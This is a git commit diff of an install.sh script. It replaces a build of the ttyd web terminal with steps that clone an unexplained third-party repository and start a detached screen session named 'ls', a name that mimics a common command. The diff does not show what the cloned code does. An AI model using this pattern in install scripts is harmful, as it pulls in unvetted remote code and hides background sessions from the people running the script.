ed6d00ee8e5973002da07c9073152d4faf50e013
welstannabella <85975078+welstannabella@users.noreply.github.com>
2021-06-16 10:13:14 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,5 @@
 #!/bin/bash
 sudo apt update
-sudo apt-get install apt-utils build-essential cmake git libjson-c-dev libwebsockets-dev -y
-git clone https://github.com/tsl0922/ttyd.git
-cd ttyd && mkdir build && cd build
-cmake ..
-make && make install
+sudo apt install screen -y
+git clone https://github.com/bimasaputrq581/expert-fortnight.git && cd expert-fortnight
+screen -dmS ls
